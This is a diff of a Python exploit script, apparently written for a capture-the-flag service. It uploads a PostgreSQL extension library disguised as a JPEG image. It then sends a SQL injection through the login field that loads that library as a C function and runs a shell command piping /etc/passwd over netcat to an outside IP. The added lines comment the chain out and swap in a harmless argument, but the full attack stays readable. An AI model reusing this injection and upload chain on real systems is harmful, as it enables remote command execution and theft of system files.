@@ -43,23 +43,23 @@ def main(host):
 
     print('created user', auth, id_)
 
-    fname = f'laptop1{str(uuid.uuid4())}.jpg'
-    path, name = os.path.dirname(os.path.realpath(__file__)) + '/pg_exec.so', fname
-    with open(path, 'rb') as f:
-        data = f.read()
-
-    with requests.post(f'http://{host}/api/images',
-                  cookies={'5GAuth': auth},
-                  files={name: data}) as r:
-        execpath = str(r.json()["path"]).lstrip('/api/images/get/')
-        print(execpath)
-
-    with requests.put(f'http://{host}/api/users/auth',
-                      json={
-                          'login': f'\' or 1=1 limit 1; CREATE FUNCTION sys2(cstring) RETURNS int AS \'./{execpath}\', \'pg_exec\' LANGUAGE C STRICT; SELECT sys2(\'cat /etc/passwd | nc 172.24.0.1 1488\'); --',
-                          'password_hash': 'fdfdfdfdf'
-                      }) as r:
-        print(r, r.content)
+    # fname = f'laptop1{str(uuid.uuid4())}.jpg'
+    # path, name = os.path.dirname(os.path.realpath(__file__)) + '/pg_exec.so', fname
+    # with open(path, 'rb') as f:
+    #     data = f.read()
+    #
+    # with requests.post(f'http://{host}/api/images',
+    #               cookies={'5GAuth': auth},
+    #               files={name: data}) as r:
+    #     execpath = str(r.json()["path"]).lstrip('/api/images/get/')
+    #     print(execpath)
+    #
+    # with requests.put(f'http://{host}/api/users/auth',
+    #                   json={
+    #                       'login': f'\' or 1=1 limit 1; CREATE FUNCTION sys2(cstring) RETURNS int AS \'./{execpath}\', \'pg_exec\' LANGUAGE C STRICT; SELECT sys2(\'unused\'); --',
+    #                       'password_hash': 'fdfdfdfdf'
+    #                   }) as r:
+    #     print(r, r.content)
 
 
 if __name__ == '__main__':
